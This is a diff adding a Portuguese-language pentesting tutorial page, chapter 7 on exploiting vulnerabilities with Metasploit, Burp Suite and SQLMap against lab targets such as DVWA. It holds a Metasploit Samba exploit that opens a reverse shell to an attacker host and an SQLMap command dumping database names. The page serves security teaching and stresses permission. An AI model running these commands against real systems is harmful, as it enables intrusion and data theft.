@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Capítulo 7 - Exploração de Vulnerabilidades</title>
+    <link rel="stylesheet" href="style.css" />
+    <link rel="icon" href="favicon.icon.jpg">
+
+
+
+
+</head>
+
+<body>
+    <header>
+        <h1>Capítulo 7: Exploração de Vulnerabilidades Reais</h1>
+    </header>
+
+    <main>
+        <section>
+            <h2>🎯 Objetivo</h2>
+            <p>
+                Agora que já sabe escanear e identificar falhas, vamos usar ferramentas poderosas como Metasploit, Burp Suite e SQLMap pra explorar essas vulnerabilidades de verdade!
+            </p>
+        </section>
+
+        <section>
+            <h2>💣 Metasploit Framework</h2>
+            <p>
+                Um dos frameworks mais usados no mundo do hacking. Ele permite executar exploits prontos de forma fácil.
+            </p>
+            <pre><code>msfconsole</code></pre>
+            <p>Exemplo: explorando falha no Samba</p>
+            <pre><code>
+use exploit/linux/samba/usermap_script  
+set RHOSTS 192.168.56.101  
+set PAYLOAD cmd/unix/reverse  
+set LHOST 192.168.56.1  
+run
+      </code></pre>
+        </section>
+
+        <section>
+            <h2>🧪 Burp Suite (Interceptando requisições)</h2>
+            <p>
+                Use ele como proxy entre o navegador e o alvo. Tu pode editar e reenviar requisições HTTP, ideal pra testar falhas tipo:
+            </p>
+            <ul>
+                <li>SQL Injection</li>
+                <li>Injeção de comandos</li>
+                <li>Autenticação quebrada</li>
+            </ul>
+            <p>Ativa o intercept, acessa o login do DVWA e manda ver.</p>
+        </section>
+
+        <section>
+            <h2>🔍 SQLMap (SQL Injection automatizado)</h2>
+            <p>
+                Ferramenta de linha de comando pra detectar e explorar falhas de SQL Injection.
+            </p>
+            <pre><code>
+sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=abc123; security=low" --dbs
+      </code></pre>
+            <p>Esse comando vai listar os bancos de dados vulneráveis. Perigo total!</p>
+        </section>
+
+        <section>
+            <h2>🔐 Exploração manual</h2>
+            <p>
+                Nem sempre as ferramentas automáticas funcionam. Saber fazer na unha também é essencial:
+            </p>
+            <ul>
+                <li>Usar lógica de injeção</li>
+                <li>Testar diferentes parâmetros</li>
+                <li>Observar comportamentos estranhos no sistema</li>
+            </ul>
+        </section>
+
+        <section>
+            <h2>🧠 Ética e Responsabilidade</h2>
+            <p>
+                Nunca esquece: só execute testes em sistemas que <strong>você tem permissão</strong>. Toda habilidade usada fora da ética vira crime. Hacker ético é aquele que protege e melhora o mundo digital.
+            </p>
+        </section>
+
+        <section>
+            <h2>🚀 Conclusão</h2>
+            <p>
+                Agora tu tá no nível dos grandes. Tu não tá mais só identificando falhas… tu tá explorando, entendendo e documentando como elas funcionam. Isso te dá o poder – e a responsabilidade – de ser um verdadeiro pentester.
+            </p>
+        </section>
+    </main>
+
+    <footer>
+        <p>© 2025 Gilbeon Santos - Gilbeon Tech Soluções</p>
+    </footer>
+</body>
+
+</html>
